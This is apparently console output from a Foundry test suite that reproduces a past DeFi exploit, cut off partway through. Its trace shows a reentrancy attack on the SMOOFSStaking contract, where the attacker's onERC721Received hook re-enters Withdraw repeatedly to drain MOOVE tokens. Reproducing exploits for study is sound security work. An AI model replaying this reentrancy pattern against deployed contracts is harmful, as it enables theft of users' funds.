Compiling 28 files with Solc 0.8.25
Solc 0.8.25 finished in 1.33s
Compiler run successful with warnings:
Warning (2519): This declaration shadows an existing declaration.
   --> src/test/interface.sol:886:5:
    |
886 |     function WETH() external view returns (address);
    |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1598:5:
     |
1598 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:1850:5:
     |
1850 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:2560:5:
     |
2560 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).

Warning (2519): This declaration shadows an existing declaration.
    --> src/test/interface.sol:3759:5:
     |
3759 |     function WETH() external view returns (address);
     |     ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
Note: The shadowed declaration is here:
   --> src/test/interface.sol:641:1:
    |
641 | interface WETH {
    | ^ (Relevant source part starts here and spans across multiple lines).


Ran 1 test for script/Exploit-template_new.sol:ExploitScript
[PASS] testExploit() (gas: 20485)
Logs:
  Attacker ETH Balance Before exploit: 0.000000000000000000
  Attacker ETH Balance After exploit: 0.000000000000000000

Traces:
  [20485] ExploitScript::testExploit()
    тФЬтФА [0] VM::deal(ExploitScript: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    тФВ   тФФтФА тЖР [Return] 
    тФЬтФА emit log_named_decimal_uint(key: "Attacker ETH Balance Before exploit", val: 0, decimals: 18)
    тФЬтФА emit log_named_decimal_uint(key: "Attacker ETH Balance After exploit", val: 0, decimals: 18)
    тФФтФА тЖР [Stop] 

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 299.30ms (378.90┬╡s CPU time)

Ran 1 test for src/test/2024-02/SMOOFSStaking_exp.sol:ContractTest
[PASS] testExploit() (gas: 27295776)
Logs:
  Attacker MOOVE balance before exploit: 52850.000000000000000000
  Attacker MOOVE balance after exploit: 57200.000000000000000000

Traces:
  [28399276] ContractTest::testExploit()
    тФЬтФА [0] VM::prank(attackContract: [0x367120bf791cC03F040E2574AeA0ca7790D3D2E5])
    тФВ   тФФтФА тЖР [Return] 
    тФЬтФА [69187] Smoofs::transferFrom(attackContract: [0x367120bf791cC03F040E2574AeA0ca7790D3D2E5], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062)
    тФВ   тФЬтФА emit Transfer(_from: attackContract: [0x367120bf791cC03F040E2574AeA0ca7790D3D2E5], _to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], _tokenId: 2062)
    тФВ   тФФтФА тЖР [Stop] 
    тФЬтФА [25422] Smoofs::approve(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062)
    тФВ   тФЬтФА emit Approval(_owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], _approved: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], _tokenId: 2062)
    тФВ   тФФтФА тЖР [Stop] 
    тФЬтФА [7889] MOOVE::balanceOf(attackContract: [0x367120bf791cC03F040E2574AeA0ca7790D3D2E5]) [staticcall]
    тФВ   тФЬтФА [2941] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::balanceOf(attackContract: [0x367120bf791cC03F040E2574AeA0ca7790D3D2E5]) [delegatecall]
    тФВ   тФВ   тФФтФА тЖР [Return] 52850000000000000000000 [5.285e22]
    тФВ   тФФтФА тЖР [Return] 52850000000000000000000 [5.285e22]
    тФЬтФА [3389] MOOVE::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФЬтФА [2941] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФФтФА тЖР [Return] 0
    тФЬтФА [0] VM::record()
    тФВ   тФФтФА тЖР [Return] 
    тФЬтФА [1389] MOOVE::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФЬтФА [941] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФФтФА тЖР [Return] 0
    тФЬтФА [0] VM::accesses(MOOVE: [0xdb6dAe4B87Be1289715c08385A6Fc1A3D970B09d])
    тФВ   тФФтФА тЖР [Return] [0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc, 0xa57d683adc15827c25afa7b92760da4bc4bcfd8f31199f30deb64e414e69c88c], []
    тФЬтФА [0] VM::load(MOOVE: [0xdb6dAe4B87Be1289715c08385A6Fc1A3D970B09d], 0xa57d683adc15827c25afa7b92760da4bc4bcfd8f31199f30deb64e414e69c88c) [staticcall]
    тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    тФЬтФА emit WARNING_UninitedSlot(who: MOOVE: [0xdb6dAe4B87Be1289715c08385A6Fc1A3D970B09d], slot: 74853195267810777783406347969109249098520047384766759631747282568800094505100 [7.485e76])
    тФЬтФА [0] VM::load(MOOVE: [0xdb6dAe4B87Be1289715c08385A6Fc1A3D970B09d], 0xa57d683adc15827c25afa7b92760da4bc4bcfd8f31199f30deb64e414e69c88c) [staticcall]
    тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    тФЬтФА [1389] MOOVE::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФЬтФА [941] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    тФВ   тФВ   тФФтФА тЖР [Return] 0
    тФВ   тФФтФА тЖР [Return] 0
    тФЬтФА [0] VM::store(MOOVE: [0xdb6dAe4B87Be1289715c08385A6Fc1A3D970B09d], 0xa57d683adc15827c25afa7b92760da4bc4bcfd8f31199f30deb64e414e69c88c, 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff)
    тФВ   тФФтФА тЖР [Return] 
    тФЬтФА [1389] MOOVE::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФЬтФА [941] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    тФВ   тФВ   тФФтФА тЖР [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    тФВ   тФФтФА тЖР [Return] 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]
    тФЬтФА [0] VM::store(MOOVE: [0xdb6dAe4B87Be1289715c08385A6Fc1A3D970B09d], 0xa57d683adc15827c25afa7b92760da4bc4bcfd8f31199f30deb64e414e69c88c, 0x0000000000000000000000000000000000000000000000000000000000000000)
    тФВ   тФФтФА тЖР [Return] 
    тФЬтФА emit SlotFound(who: MOOVE: [0xdb6dAe4B87Be1289715c08385A6Fc1A3D970B09d], fsig: 0x70a08231, keysHash: 0x5ff10565516c110180bb9cc111cdbc2b0a68e09ff7fac17290373c3aa4a1bb03, slot: 74853195267810777783406347969109249098520047384766759631747282568800094505100 [7.485e76])
    тФЬтФА [0] VM::load(MOOVE: [0xdb6dAe4B87Be1289715c08385A6Fc1A3D970B09d], 0xa57d683adc15827c25afa7b92760da4bc4bcfd8f31199f30deb64e414e69c88c) [staticcall]
    тФВ   тФФтФА тЖР [Return] 0x0000000000000000000000000000000000000000000000000000000000000000
    тФЬтФА [0] VM::store(MOOVE: [0xdb6dAe4B87Be1289715c08385A6Fc1A3D970B09d], 0xa57d683adc15827c25afa7b92760da4bc4bcfd8f31199f30deb64e414e69c88c, 0x000000000000000000000000000000000000000000000b310115ecb302880000)
    тФВ   тФФтФА тЖР [Return] 
    тФЬтФА [1389] MOOVE::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФЬтФА [941] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    тФВ   тФВ   тФФтФА тЖР [Return] 52850000000000000000000 [5.285e22]
    тФВ   тФФтФА тЖР [Return] 52850000000000000000000 [5.285e22]
    тФЬтФА [25893] MOOVE::approve(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    тФВ   тФЬтФА [25442] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::approve(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
    тФВ   тФВ   тФЬтФА emit Approval(owner: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], spender: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], value: 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФФтФА тЖР [Return] true
    тФЬтФА [1389] MOOVE::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [staticcall]
    тФВ   тФЬтФА [941] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::balanceOf(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]) [delegatecall]
    тФВ   тФВ   тФФтФА тЖР [Return] 52850000000000000000000 [5.285e22]
    тФВ   тФФтФА тЖР [Return] 52850000000000000000000 [5.285e22]
    тФЬтФА [834] MOOVE::decimals() [staticcall]
    тФВ   тФЬтФА [389] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::decimals() [delegatecall]
    тФВ   тФВ   тФФтФА тЖР [Return] 18
    тФВ   тФФтФА тЖР [Return] 18
    тФЬтФА emit log_named_decimal_uint(key: "Attacker MOOVE balance before exploit", val: 52850000000000000000000 [5.285e22], decimals: 18)
    тФЬтФА [8375330] SMOOFSStaking::Stake(2062)
    тФВ   тФЬтФА [8370440] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::Stake(2062) [delegatecall]
    тФВ   тФВ   тФЬтФА [602] Smoofs::ownerOf(2062) [staticcall]
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]
    тФВ   тФВ   тФЬтФА [12300] MOOVE::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 500000000000000000000 [5e20])
    тФВ   тФВ   тФВ   тФЬтФА [11843] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 500000000000000000000 [5e20]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], value: 500000000000000000000 [5e20])
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФЬтФА [59850] Smoofs::safeTransferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062)
    тФВ   тФВ   тФВ   тФЬтФА emit Transfer(_from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], _to: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], _tokenId: 2062)
    тФВ   тФВ   тФВ   тФЬтФА [2284] SMOOFSStaking::onERC721Received(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x)
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [1870] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::onERC721Received(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x150b7a02
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x150b7a02
    тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФФтФА тЖР [Return] 
    тФЬтФА [19649934] SMOOFSStaking::Withdraw(2062, true)
    тФВ   тФЬтФА [19649541] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::Withdraw(2062, true) [delegatecall]
    тФВ   тФВ   тФЬтФА [5500] MOOVE::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 150000000000000000000 [1.5e20])
    тФВ   тФВ   тФВ   тФЬтФА [5043] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::transferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 150000000000000000000 [1.5e20]) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], to: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], value: 150000000000000000000 [1.5e20])
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФЬтФА [4817] MOOVE::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0)
    тФВ   тФВ   тФВ   тФЬтФА [4366] 0x64978Ccf3De3c5c7b78F7FdF7E177f05e6AF35Fd::transfer(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 0) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], value: 0)
    тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФВ   тФФтФА тЖР [Return] true
    тФВ   тФВ   тФЬтФА [17748546] Smoofs::safeTransferFrom(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062)
    тФВ   тФВ   тФВ   тФЬтФА emit Transfer(_from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], _to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], _tokenId: 2062)
    тФВ   тФВ   тФВ   тФЬтФА [17700816] ContractTest::onERC721Received(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062, 0x)
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [52814] Smoofs::safeTransferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(_from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], _to: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], _tokenId: 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2284] SMOOFSStaking::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1870] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x150b7a02
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x150b7a02
    тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФЬтФА [17624060] SMOOFSStaking::Withdraw(2062, true)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [17623667] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::Withdraw(2062, true) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [15763573] Smoofs::safeTransferFrom(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(_from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], _to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], _tokenId: 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [15715843] ContractTest::onERC721Received(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062, 0x)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [52814] Smoofs::safeTransferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(_from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], _to: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], _tokenId: 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2284] SMOOFSStaking::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1870] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x150b7a02
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x150b7a02
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [15660987] SMOOFSStaking::Withdraw(2062, true)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [15660594] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::Withdraw(2062, true) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [13800500] Smoofs::safeTransferFrom(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(_from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], _to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], _tokenId: 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [13752770] ContractTest::onERC721Received(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062, 0x)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [52814] Smoofs::safeTransferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(_from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], _to: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], _tokenId: 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2284] SMOOFSStaking::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1870] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x150b7a02
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x150b7a02
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [13697914] SMOOFSStaking::Withdraw(2062, true)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [13697521] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::Withdraw(2062, true) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [11837427] Smoofs::safeTransferFrom(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(_from: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], _to: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], _tokenId: 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [11789697] ContractTest::onERC721Received(SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062, 0x)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [52814] Smoofs::safeTransferFrom(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА emit Transfer(_from: ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], _to: SMOOFSStaking: [0x757C2d1Ef0942F7a1B9FC1E618Aea3a6F3441A3C], _tokenId: 2062)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [2284] SMOOFSStaking::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x)
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [1870] 0x9D6cb01fB91F8c6616e822Cf90A4b3D8Eb0569c6::onERC721Received(ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2062, 0x) [delegatecall]
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x150b7a02
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Return] 0x150b7a02
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФФтФА тЖР [Stop] 
    тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФВ   тФЬтФА [11734841] SMOOFSStaking::Withdraw(2062, true)
